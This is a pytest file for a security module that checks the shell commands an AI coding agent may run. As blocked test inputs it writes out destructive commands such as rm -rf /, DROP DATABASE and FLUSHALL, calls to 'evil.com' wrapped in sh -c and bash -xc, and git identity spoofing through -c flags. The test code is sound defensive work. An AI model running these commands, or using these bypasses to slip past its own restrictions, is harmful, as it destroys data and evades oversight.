#!/usr/bin/env python3
"""
Tests for Security System
=========================

Tests the security.py module functionality including:
- Command extraction and parsing
- Command allowlist validation
- Sensitive command validators (rm, chmod, pkill, etc.)
- Security hook behavior
"""

import pytest
from project_analyzer import BASE_COMMANDS, SecurityProfile
from security import (
    extract_commands,
    get_command_for_validation,
    reset_profile_cache,
    split_command_segments,
    validate_bash_command,
    validate_chmod_command,
    validate_command,
    validate_dropdb_command,
    validate_dropuser_command,
    validate_git_commit,
    validate_git_config,
    validate_kill_command,
    validate_mongosh_command,
    validate_mysql_command,
    validate_mysqladmin_command,
    validate_pkill_command,
    validate_psql_command,
    validate_redis_cli_command,
    validate_rm_command,
    validate_sh_command,
    validate_shell_c_command,
    validate_zsh_command,
)


class TestCommandExtraction:
    """Tests for command extraction from shell strings."""

    def test_simple_command(self):
        """Extracts single command correctly."""
        commands = extract_commands("ls -la")
        assert commands == ["ls"]

    def test_command_with_path(self):
        """Extracts command from path."""
        commands = extract_commands("/usr/bin/python script.py")
        assert commands == ["python"]

    def test_piped_commands(self):
        """Extracts all commands from pipeline."""
        commands = extract_commands("cat file.txt | grep pattern | wc -l")
        assert commands == ["cat", "grep", "wc"]

    def test_chained_commands_and(self):
        """Extracts commands from && chain."""
        commands = extract_commands("cd /tmp && ls && pwd")
        assert commands == ["cd", "ls", "pwd"]

    def test_chained_commands_or(self):
        """Extracts commands from || chain."""
        commands = extract_commands("test -f file || echo 'not found'")
        assert commands == ["test", "echo"]

    def test_semicolon_separated(self):
        """Extracts commands separated by semicolons."""
        commands = extract_commands("echo hello; echo world; ls")
        assert commands == ["echo", "echo", "ls"]

    def test_mixed_operators(self):
        """Handles mixed operators correctly."""
        commands = extract_commands("cmd1 && cmd2 || cmd3; cmd4 | cmd5")
        assert commands == ["cmd1", "cmd2", "cmd3", "cmd4", "cmd5"]

    def test_skips_flags(self):
        """Doesn't include flags as commands."""
        commands = extract_commands("ls -la --color=auto")
        assert commands == ["ls"]

    def test_skips_variable_assignments(self):
        """Skips variable assignments."""
        commands = extract_commands("VAR=value echo $VAR")
        assert commands == ["echo"]

    def test_handles_quotes(self):
        """Handles quoted arguments."""
        commands = extract_commands('echo "hello world" && grep "pattern with spaces"')
        assert commands == ["echo", "grep"]

    def test_empty_string(self):
        """Returns empty list for empty string."""
        commands = extract_commands("")
        assert commands == []

    def test_malformed_command(self):
        """Uses fallback parser for malformed commands (Windows path support).

        The fallback parser extracts command names even from commands with
        unclosed quotes, which is common when Windows paths are used.
        """
        commands = extract_commands("echo 'unclosed quote")
        assert commands == ["echo"]

    def test_windows_path_command(self):
        """Handles Windows paths with backslashes."""
        commands = extract_commands(r'C:\Python312\python.exe -c "print(1)"')
        assert "python" in commands

    def test_incomplete_windows_path_command(self):
        """Handles incomplete commands with Windows paths (common AI generation issue)."""
        cmd = r'python3 -c "import json; json.load(open(\'D:\path\file.json'
        commands = extract_commands(cmd)
        assert commands == ["python3"]


class TestSplitCommandSegments:
    """Tests for splitting command strings into segments."""

    def test_single_command(self):
        """Single command returns one segment."""
        segments = split_command_segments("ls -la")
        assert segments == ["ls -la"]

    def test_and_chain(self):
        """Splits on &&."""
        segments = split_command_segments("cd /tmp && ls")
        assert segments == ["cd /tmp", "ls"]

    def test_or_chain(self):
        """Splits on ||."""
        segments = split_command_segments("test -f file || echo error")
        assert segments == ["test -f file", "echo error"]

    def test_semicolon(self):
        """Splits on semicolons."""
        segments = split_command_segments("echo a; echo b; echo c")
        assert segments == ["echo a", "echo b", "echo c"]


class TestPkillValidator:
    """Tests for pkill command validation."""

    def test_allowed_process_node(self):
        """Allows killing node processes."""
        allowed, reason = validate_pkill_command("pkill -f node")
        assert allowed is True

    def test_allowed_process_python(self):
        """Allows killing python processes."""
        allowed, reason = validate_pkill_command("pkill python")
        assert allowed is True

    def test_allowed_process_vite(self):
        """Allows killing vite processes."""
        allowed, reason = validate_pkill_command("pkill vite")
        assert allowed is True

    def test_blocked_system_process(self):
        """Blocks killing system processes."""
        allowed, reason = validate_pkill_command("pkill init")
        assert allowed is False
        assert "dev processes" in reason

    def test_blocked_arbitrary_process(self):
        """Blocks killing arbitrary processes."""
        allowed, reason = validate_pkill_command("pkill systemd")
        assert allowed is False


class TestKillValidator:
    """Tests for kill command validation."""

    def test_allowed_specific_pid(self):
        """Allows killing specific PID."""
        allowed, reason = validate_kill_command("kill 12345")
        assert allowed is True

    def test_allowed_with_signal(self):
        """Allows kill with signal."""
        allowed, reason = validate_kill_command("kill -9 12345")
        assert allowed is True

    def test_blocked_kill_all(self):
        """Blocks kill -1 (kill all)."""
        allowed, reason = validate_kill_command("kill -9 -1")
        assert allowed is False
        assert "all processes" in reason

    def test_blocked_kill_group_zero(self):
        """Blocks kill 0 (process group)."""
        allowed, reason = validate_kill_command("kill 0")
        assert allowed is False


class TestChmodValidator:
    """Tests for chmod command validation."""

    def test_allowed_plus_x(self):
        """Allows +x (make executable)."""
        allowed, reason = validate_chmod_command("chmod +x script.sh")
        assert allowed is True

    def test_allowed_755(self):
        """Allows 755 mode."""
        allowed, reason = validate_chmod_command("chmod 755 script.sh")
        assert allowed is True

    def test_allowed_644(self):
        """Allows 644 mode."""
        allowed, reason = validate_chmod_command("chmod 644 file.txt")
        assert allowed is True

    def test_allowed_user_executable(self):
        """Allows u+x."""
        allowed, reason = validate_chmod_command("chmod u+x script.sh")
        assert allowed is True

    def test_blocked_world_writable(self):
        """Blocks world-writable modes."""
        allowed, reason = validate_chmod_command("chmod 777 file.txt")
        assert allowed is False
        assert "executable modes" in reason

    def test_blocked_arbitrary_mode(self):
        """Blocks arbitrary chmod modes."""
        allowed, reason = validate_chmod_command("chmod 000 file.txt")
        assert allowed is False

    def test_requires_file(self):
        """Requires at least one file argument."""
        allowed, reason = validate_chmod_command("chmod +x")
        assert allowed is False
        assert "at least one file" in reason


class TestRmValidator:
    """Tests for rm command validation."""

    def test_allowed_specific_file(self):
        """Allows removing specific files."""
        allowed, reason = validate_rm_command("rm file.txt")
        assert allowed is True

    def test_allowed_directory(self):
        """Allows removing directory with -r."""
        allowed, reason = validate_rm_command("rm -rf build/")
        assert allowed is True

    def test_blocked_root(self):
        """Blocks rm /."""
        allowed, reason = validate_rm_command("rm -rf /")
        assert allowed is False
        assert "not allowed for safety" in reason

    def test_blocked_home(self):
        """Blocks rm ~."""
        allowed, reason = validate_rm_command("rm -rf ~")
        assert allowed is False

    def test_blocked_parent_escape(self):
        """Blocks rm ../."""
        allowed, reason = validate_rm_command("rm -rf ../")
        assert allowed is False

    def test_blocked_root_wildcard(self):
        """Blocks rm /*."""
        allowed, reason = validate_rm_command("rm -rf /*")
        assert allowed is False

    def test_blocked_system_dirs(self):
        """Blocks system directories."""
        for dir in ["/usr", "/etc", "/var", "/bin", "/lib"]:
            allowed, reason = validate_rm_command(f"rm -rf {dir}")
            assert allowed is False


class TestValidateCommand:
    """Tests for full command validation."""

    def test_base_commands_allowed(self, temp_dir):
        """Base commands are always allowed."""
        reset_profile_cache()

        for cmd in ["ls", "cat", "grep", "echo", "pwd"]:
            allowed, reason = validate_command(cmd, temp_dir)
            assert allowed is True, f"{cmd} should be allowed"

    def test_git_commands_allowed(self, temp_dir):
        """Git commands are allowed."""
        reset_profile_cache()

        allowed, reason = validate_command("git status", temp_dir)
        assert allowed is True

    def test_dangerous_command_blocked(self, temp_dir):
        """Dangerous commands not in allowlist are blocked."""
        reset_profile_cache()

        allowed, reason = validate_command("format c:", temp_dir)
        assert allowed is False

    def test_rm_safe_usage_allowed(self, temp_dir):
        """rm with safe arguments is allowed."""
        reset_profile_cache()

        allowed, reason = validate_command("rm file.txt", temp_dir)
        assert allowed is True

    def test_rm_dangerous_usage_blocked(self, temp_dir):
        """rm with dangerous arguments is blocked."""
        reset_profile_cache()

        allowed, reason = validate_command("rm -rf /", temp_dir)
        assert allowed is False

    def test_piped_commands_all_checked(self, temp_dir):
        """All commands in pipeline are validated."""
        reset_profile_cache()

        # All safe commands
        allowed, reason = validate_command("cat file | grep pattern | wc -l", temp_dir)
        assert allowed is True


class TestGetCommandForValidation:
    """Tests for finding command segment for validation."""

    def test_finds_correct_segment(self):
        """Finds the segment containing the command."""
        segments = ["cd /tmp", "rm -rf build", "ls"]
        segment = get_command_for_validation("rm", segments)
        assert segment == "rm -rf build"

    def test_returns_empty_when_not_found(self):
        """Returns empty string when command not found."""
        segments = ["ls", "pwd"]
        segment = get_command_for_validation("rm", segments)
        assert segment == ""


class TestSecurityProfileIntegration:
    """Tests for security profile integration."""

    def test_profile_detects_python_commands(self, python_project):
        """Profile includes Python commands for Python projects."""
        from project_analyzer import get_or_create_profile
        reset_profile_cache()

        profile = get_or_create_profile(python_project)

        assert "python" in profile.get_all_allowed_commands()
        assert "pip" in profile.get_all_allowed_commands()

    def test_profile_detects_node_commands(self, node_project):
        """Profile includes Node commands for Node projects."""
        from project_analyzer import get_or_create_profile
        reset_profile_cache()

        profile = get_or_create_profile(node_project)

        assert "npm" in profile.get_all_allowed_commands()
        assert "node" in profile.get_all_allowed_commands()

    def test_profile_detects_docker_commands(self, docker_project):
        """Profile includes Docker commands for Docker projects."""
        from project_analyzer import get_or_create_profile
        reset_profile_cache()

        profile = get_or_create_profile(docker_project)

        assert "docker" in profile.get_all_allowed_commands()
        assert "docker-compose" in profile.get_all_allowed_commands()

    def test_profile_caching(self, python_project):
        """Profile is cached after first analysis."""
        from project_analyzer import get_or_create_profile
        from security import get_security_profile, reset_profile_cache
        reset_profile_cache()

        # First call - analyzes
        profile1 = get_security_profile(python_project)

        # Second call - should use cache
        profile2 = get_security_profile(python_project)

        assert profile1 is profile2


class TestGitCommitValidator:
    """Tests for git commit validation (secret scanning)."""

    def test_allows_normal_commit(self, temp_git_repo, stage_files, monkeypatch):
        """Allows commit without secrets."""
        stage_files({"normal.py": "x = 42\n"})
        monkeypatch.chdir(temp_git_repo)

        allowed, reason = validate_git_commit("git commit -m 'test'")
        assert allowed is True

    def test_non_commit_commands_pass(self):
        """Non-commit git commands always pass."""
        allowed, reason = validate_git_commit("git status")
        assert allowed is True

        allowed, reason = validate_git_commit("git add .")
        assert allowed is True

        allowed, reason = validate_git_commit("git push")
        assert allowed is True


class TestGitConfigValidator:
    """Tests for git config validation (blocking identity changes)."""

    def test_blocks_user_name(self):
        """Blocks git config user.name."""
        allowed, reason = validate_git_config("git config user.name 'Test User'")
        assert allowed is False
        assert "BLOCKED" in reason
        assert "identity" in reason.lower()

    def test_blocks_user_email(self):
        """Blocks git config user.email."""
        allowed, reason = validate_git_config("git config user.email 'test@example.com'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_author_name(self):
        """Blocks git config author.name."""
        allowed, reason = validate_git_config("git config author.name 'Fake Author'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_committer_email(self):
        """Blocks git config committer.email."""
        allowed, reason = validate_git_config("git config committer.email 'fake@test.com'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_with_global_flag(self):
        """Blocks identity config even with --global flag."""
        allowed, reason = validate_git_config("git config --global user.name 'Test User'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_with_local_flag(self):
        """Blocks identity config even with --local flag."""
        allowed, reason = validate_git_config("git config --local user.email 'test@example.com'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_allows_non_identity_config(self):
        """Allows setting non-identity config options."""
        allowed, reason = validate_git_config("git config core.autocrlf true")
        assert allowed is True

        allowed, reason = validate_git_config("git config diff.algorithm patience")
        assert allowed is True

        allowed, reason = validate_git_config("git config pull.rebase true")
        assert allowed is True

    def test_allows_config_list(self):
        """Allows git config --list and similar read operations."""
        allowed, reason = validate_git_config("git config --list")
        assert allowed is True

        allowed, reason = validate_git_config("git config --get user.name")
        assert allowed is True

    def test_allows_non_config_commands(self):
        """Non-config git commands pass through."""
        allowed, reason = validate_git_config("git status")
        assert allowed is True

        allowed, reason = validate_git_config("git commit -m 'test'")
        assert allowed is True

    def test_case_insensitive_blocking(self):
        """Blocks identity keys regardless of case."""
        allowed, reason = validate_git_config("git config USER.NAME 'Test'")
        assert allowed is False

        allowed, reason = validate_git_config("git config User.Email 'test@test.com'")
        assert allowed is False

    def test_handles_malformed_command(self):
        """Handles malformed commands gracefully."""
        # Unbalanced quotes - should fail closed
        allowed, reason = validate_git_config("git config user.name 'Test User")
        assert allowed is False
        assert "parse" in reason.lower()


class TestGitIdentityProtection:
    """Tests for git identity protection (blocking -c flag bypass)."""

    def test_blocks_inline_user_name(self):
        """Blocks git -c user.name=... on any command."""
        allowed, reason = validate_git_commit("git -c user.name=Evil commit -m 'test'")
        assert allowed is False
        assert "BLOCKED" in reason
        assert "identity" in reason.lower()

    def test_blocks_inline_user_email(self):
        """Blocks git -c user.email=... on any command."""
        allowed, reason = validate_git_commit("git -c user.email=fake@test.com commit -m 'test'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_inline_author_name(self):
        """Blocks git -c author.name=... on any command."""
        allowed, reason = validate_git_commit("git -c author.name=FakeAuthor push")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_inline_committer_email(self):
        """Blocks git -c committer.email=... on any command."""
        allowed, reason = validate_git_commit("git -c committer.email=fake@test.com log")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_blocks_nospace_format(self):
        """Blocks -ckey=value format (no space after -c)."""
        allowed, reason = validate_git_commit("git -cuser.name=Evil commit -m 'test'")
        assert allowed is False
        assert "BLOCKED" in reason

    def test_allows_non_identity_config(self):
        """Allows -c with non-blocked config keys."""
        allowed, reason = validate_git_commit("git -c core.autocrlf=true commit -m 'test'")
        assert allowed is True

        allowed, reason = validate_git_commit("git -c diff.algorithm=patience diff")
        assert allowed is True

    def test_allows_normal_git_commands(self):
        """Normal git commands without -c identity flags pass."""
        allowed, reason = validate_git_commit("git status")
        assert allowed is True

        allowed, reason = validate_git_commit("git log --oneline")
        assert allowed is True

        allowed, reason = validate_git_commit("git branch -a")
        assert allowed is True

    def test_case_insensitive_blocking(self):
        """Blocks identity keys regardless of case."""
        allowed, reason = validate_git_commit("git -c USER.NAME=Evil commit -m 'test'")
        assert allowed is False

        allowed, reason = validate_git_commit("git -c User.Email=fake@test.com push")
        assert allowed is False


# =============================================================================
# DATABASE VALIDATOR TESTS
# =============================================================================

class TestDropdbValidator:
    """Tests for dropdb command validation."""

    def test_allows_test_database(self):
        """Allows dropping test databases."""
        allowed, reason = validate_dropdb_command("dropdb test_myapp")
        assert allowed is True

        allowed, reason = validate_dropdb_command("dropdb myapp_test")
        assert allowed is True

    def test_allows_dev_database(self):
        """Allows dropping dev databases."""
        allowed, reason = validate_dropdb_command("dropdb dev_myapp")
        assert allowed is True

        allowed, reason = validate_dropdb_command("dropdb myapp_dev")
        assert allowed is True

    def test_allows_local_database(self):
        """Allows dropping local databases."""
        allowed, reason = validate_dropdb_command("dropdb local_myapp")
        assert allowed is True

    def test_allows_tmp_database(self):
        """Allows dropping tmp/temp databases."""
        allowed, reason = validate_dropdb_command("dropdb tmp_data")
        assert allowed is True

        allowed, reason = validate_dropdb_command("dropdb temp_cache")
        assert allowed is True

    def test_allows_sandbox_database(self):
        """Allows dropping sandbox databases."""
        allowed, reason = validate_dropdb_command("dropdb sandbox")
        assert allowed is True

    def test_blocks_production_database(self):
        """Blocks dropping production databases."""
        allowed, reason = validate_dropdb_command("dropdb production")
        assert allowed is False
        assert "blocked for safety" in reason

    def test_blocks_main_database(self):
        """Blocks dropping main/primary databases."""
        allowed, reason = validate_dropdb_command("dropdb main")
        assert allowed is False

        allowed, reason = validate_dropdb_command("dropdb myapp")
        assert allowed is False

    def test_blocks_staging_database(self):
        """Blocks dropping staging databases."""
        allowed, reason = validate_dropdb_command("dropdb staging")
        assert allowed is False

    def test_handles_flags(self):
        """Correctly parses command with flags."""
        allowed, reason = validate_dropdb_command("dropdb -h localhost -p 5432 -U admin test_db")
        assert allowed is True

        allowed, reason = validate_dropdb_command("dropdb -h localhost -p 5432 production")
        assert allowed is False


class TestDropuserValidator:
    """Tests for dropuser command validation."""

    def test_allows_test_user(self):
        """Allows dropping test users."""
        allowed, reason = validate_dropuser_command("dropuser test_user")
        assert allowed is True

    def test_allows_dev_user(self):
        """Allows dropping dev users."""
        allowed, reason = validate_dropuser_command("dropuser dev_admin")
        assert allowed is True

    def test_blocks_production_user(self):
        """Blocks dropping production users."""
        allowed, reason = validate_dropuser_command("dropuser admin")
        assert allowed is False

        allowed, reason = validate_dropuser_command("dropuser postgres")
        assert allowed is False


class TestPsqlValidator:
    """Tests for psql command validation."""

    def test_allows_select(self):
        """Allows SELECT queries."""
        allowed, reason = validate_psql_command("psql -c 'SELECT * FROM users'")
        assert allowed is True

    def test_allows_insert(self):
        """Allows INSERT queries."""
        allowed, reason = validate_psql_command("psql -c \"INSERT INTO users (name) VALUES ('test')\"")
        assert allowed is True

    def test_allows_update_with_where(self):
        """Allows UPDATE with WHERE clause."""
        allowed, reason = validate_psql_command("psql -c \"UPDATE users SET name='new' WHERE id=1\"")
        assert allowed is True

    def test_allows_create_table(self):
        """Allows CREATE TABLE."""
        allowed, reason = validate_psql_command("psql -c 'CREATE TABLE test (id INT)'")
        assert allowed is True

    def test_blocks_drop_database(self):
        """Blocks DROP DATABASE."""
        allowed, reason = validate_psql_command("psql -c 'DROP DATABASE production'")
        assert allowed is False
        assert "destructive SQL" in reason

    def test_blocks_drop_table(self):
        """Blocks DROP TABLE."""
        allowed, reason = validate_psql_command("psql -c 'DROP TABLE users'")
        assert allowed is False

    def test_blocks_truncate(self):
        """Blocks TRUNCATE."""
        allowed, reason = validate_psql_command("psql -c 'TRUNCATE TABLE users'")
        assert allowed is False

    def test_blocks_delete_without_where(self):
        """Blocks DELETE without WHERE clause."""
        allowed, reason = validate_psql_command("psql -c 'DELETE FROM users;'")
        assert allowed is False

    def test_allows_interactive_session(self):
        """Allows interactive psql session (no -c flag)."""
        allowed, reason = validate_psql_command("psql -h localhost mydb")
        assert allowed is True


class TestMysqlValidator:
    """Tests for mysql command validation."""

    def test_allows_select(self):
        """Allows SELECT queries."""
        allowed, reason = validate_mysql_command("mysql -e 'SELECT * FROM users'")
        assert allowed is True

    def test_blocks_drop_database(self):
        """Blocks DROP DATABASE."""
        allowed, reason = validate_mysql_command("mysql -e 'DROP DATABASE production'")
        assert allowed is False

    def test_blocks_drop_table(self):
        """Blocks DROP TABLE."""
        allowed, reason = validate_mysql_command("mysql -e 'DROP TABLE users'")
        assert allowed is False

    def test_blocks_truncate(self):
        """Blocks TRUNCATE."""
        allowed, reason = validate_mysql_command("mysql --execute 'TRUNCATE users'")
        assert allowed is False

    def test_allows_interactive_session(self):
        """Allows interactive mysql session."""
        allowed, reason = validate_mysql_command("mysql -h localhost -u root mydb")
        assert allowed is True


class TestRedisCliValidator:
    """Tests for redis-cli command validation."""

    def test_allows_get(self):
        """Allows GET command."""
        allowed, reason = validate_redis_cli_command("redis-cli GET mykey")
        assert allowed is True

    def test_allows_set(self):
        """Allows SET command."""
        allowed, reason = validate_redis_cli_command("redis-cli SET mykey 'value'")
        assert allowed is True

    def test_allows_keys(self):
        """Allows KEYS command."""
        allowed, reason = validate_redis_cli_command("redis-cli KEYS '*'")
        assert allowed is True

    def test_allows_del_specific(self):
        """Allows DEL for specific keys."""
        allowed, reason = validate_redis_cli_command("redis-cli DEL mykey")
        assert allowed is True

    def test_blocks_flushall(self):
        """Blocks FLUSHALL."""
        allowed, reason = validate_redis_cli_command("redis-cli FLUSHALL")
        assert allowed is False
        assert "blocked for safety" in reason

    def test_blocks_flushdb(self):
        """Blocks FLUSHDB."""
        allowed, reason = validate_redis_cli_command("redis-cli FLUSHDB")
        assert allowed is False

    def test_blocks_shutdown(self):
        """Blocks SHUTDOWN."""
        allowed, reason = validate_redis_cli_command("redis-cli SHUTDOWN")
        assert allowed is False

    def test_blocks_config(self):
        """Blocks CONFIG commands."""
        allowed, reason = validate_redis_cli_command("redis-cli CONFIG SET maxmemory 100mb")
        assert allowed is False

    def test_handles_connection_flags(self):
        """Correctly handles connection flags."""
        allowed, reason = validate_redis_cli_command("redis-cli -h localhost -p 6379 GET mykey")
        assert allowed is True

        allowed, reason = validate_redis_cli_command("redis-cli -h localhost FLUSHALL")
        assert allowed is False


class TestMongoshValidator:
    """Tests for mongosh/mongo command validation."""

    def test_allows_find(self):
        """Allows find queries."""
        allowed, reason = validate_mongosh_command("mongosh --eval 'db.users.find()'")
        assert allowed is True

    def test_allows_insert(self):
        """Allows insert operations."""
        allowed, reason = validate_mongosh_command("mongosh --eval \"db.users.insertOne({name: 'test'})\"")
        assert allowed is True

    def test_blocks_drop_database(self):
        """Blocks dropDatabase()."""
        allowed, reason = validate_mongosh_command("mongosh --eval 'db.dropDatabase()'")
        assert allowed is False
        assert "destructive operation" in reason

    def test_blocks_drop_collection(self):
        """Blocks drop() on collections."""
        allowed, reason = validate_mongosh_command("mongosh --eval 'db.users.drop()'")
        assert allowed is False

    def test_blocks_delete_all(self):
        """Blocks deleteMany({}) which deletes all documents."""
        allowed, reason = validate_mongosh_command("mongosh --eval 'db.users.deleteMany({})'")
        assert allowed is False

    def test_allows_delete_with_filter(self):
        """Allows deleteMany with a filter."""
        allowed, reason = validate_mongosh_command("mongosh --eval \"db.users.deleteMany({status: 'inactive'})\"")
        assert allowed is True

    def test_allows_interactive_session(self):
        """Allows interactive mongosh session."""
        allowed, reason = validate_mongosh_command("mongosh mongodb://localhost/mydb")
        assert allowed is True


class TestMysqladminValidator:
    """Tests for mysqladmin command validation."""

    def test_allows_status(self):
        """Allows status check."""
        allowed, reason = validate_mysqladmin_command("mysqladmin status")
        assert allowed is True

    def test_allows_ping(self):
        """Allows ping."""
        allowed, reason = validate_mysqladmin_command("mysqladmin ping")
        assert allowed is True

    def test_allows_create(self):
        """Allows create database."""
        allowed, reason = validate_mysqladmin_command("mysqladmin create test_db")
        assert allowed is True

    def test_blocks_drop(self):
        """Blocks drop database."""
        allowed, reason = validate_mysqladmin_command("mysqladmin drop production")
        assert allowed is False

    def test_blocks_shutdown(self):
        """Blocks shutdown."""
        allowed, reason = validate_mysqladmin_command("mysqladmin shutdown")
        assert allowed is False

    def test_blocks_kill(self):
        """Blocks kill."""
        allowed, reason = validate_mysqladmin_command("mysqladmin kill 123")
        assert allowed is False


class TestShellCValidator:
    """Tests for bash/sh/zsh -c command validation.

    These validators prevent using shell interpreters to bypass the
    security allowlist by executing arbitrary commands via -c flag.
    """

    def test_allows_bash_without_c_flag(self):
        """Allows bash without -c flag (script execution)."""
        allowed, reason = validate_bash_command("bash script.sh")
        assert allowed is True

    def test_allows_sh_without_c_flag(self):
        """Allows sh without -c flag."""
        allowed, reason = validate_sh_command("sh ./install.sh")
        assert allowed is True

    def test_allows_zsh_without_c_flag(self):
        """Allows zsh without -c flag."""
        allowed, reason = validate_zsh_command("zsh myscript.zsh")
        assert allowed is True

    def test_allows_empty_c_command(self):
        """Allows empty -c command (harmless)."""
        allowed, reason = validate_bash_command("bash -c ''")
        assert allowed is True

    def test_allows_bash_c_with_allowed_command(self, tmp_path, monkeypatch):
        """Allows bash -c with commands that are in the allowlist."""
        from project.analyzer import ProjectAnalyzer

        # Set up a mock project directory with a security profile
        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        # Compute the actual hash for this directory so profile isn't re-analyzed
        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        # Create a minimal security profile with ls, echo, pwd
        import json
        profile_data = {
            "base_commands": ["ls", "echo", "pwd", "cd"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        # Reset cache to pick up the new profile
        reset_profile_cache()

        allowed, reason = validate_bash_command("bash -c 'ls -la'")
        assert allowed is True

        allowed, reason = validate_bash_command("bash -c 'echo hello && pwd'")
        assert allowed is True

    def test_blocks_bash_c_with_disallowed_command(self, tmp_path, monkeypatch):
        """Blocks bash -c with commands not in the allowlist."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        # Compute the actual hash for this directory so profile isn't re-analyzed
        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        # Create a minimal security profile WITHOUT npm
        import json
        profile_data = {
            "base_commands": ["ls", "echo"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # npm is not in the allowlist, so this should be blocked
        allowed, reason = validate_bash_command("bash -c 'npm test'")
        assert allowed is False
        assert "npm" in reason
        assert "not allowed" in reason

    def test_blocks_sh_c_with_disallowed_command(self, tmp_path, monkeypatch):
        """Blocks sh -c with commands not in the allowlist."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        # Compute the actual hash for this directory so profile isn't re-analyzed
        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        allowed, reason = validate_sh_command("sh -c 'curl http://evil.com'")
        assert allowed is False
        assert "curl" in reason

    def test_handles_complex_c_command(self, tmp_path, monkeypatch):
        """Handles complex commands with pipes and chains."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        # Compute the actual hash for this directory so profile isn't re-analyzed
        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "grep", "wc"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # All commands are allowed
        allowed, reason = validate_bash_command("bash -c 'ls -la | grep pattern | wc -l'")
        assert allowed is True

        # One command not allowed
        allowed, reason = validate_bash_command("bash -c 'ls -la | npm run test'")
        assert allowed is False

    def test_blocks_combined_xc_flag(self, tmp_path, monkeypatch):
        """Blocks bash -xc with disallowed commands (combined flags bypass)."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "echo"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
        (tmp_path / ".auto-claude-security.json").write_text(json.dumps(profile_data))

        reset_profile_cache()

        # Combined -xc flag should be detected and curl blocked
        allowed, reason = validate_bash_command("bash -xc 'curl http://evil.com'")
        assert allowed is False
        assert "curl" in reason

    def test_blocks_combined_ec_flag(self, tmp_path, monkeypatch):
        """Blocks bash -ec with disallowed commands."""
        from project.analyzer import ProjectAnalyzer

        monkeypatch.setenv("AUTO_CLAUDE_PROJECT_DIR", str(tmp_path))

        actual_hash = ProjectAnalyzer(tmp_path).compute_project_hash()

        import json
        profile_data = {
            "base_commands": ["ls", "echo"],
            "stack_commands": [],
            "script_commands": [],
            "custom_commands": [],
            "detected_stack": {
                "languages": [],
                "package_managers": [],
                "frameworks": [],
                "databases": [],
                "infrastructure": [],
                "cloud_providers": [],
                "code_quality_tools": [],
                "version_managers": []
            },
            "custom_scripts": {
                "npm_scripts": [],
                "make_targets": [],
                "poetry_scripts": [],
                "cargo_aliases": [],
                "shell_scripts": []
            },
            "project_dir": str(tmp_path),
            "created_at": "",
            "project_hash": actual_hash
        }
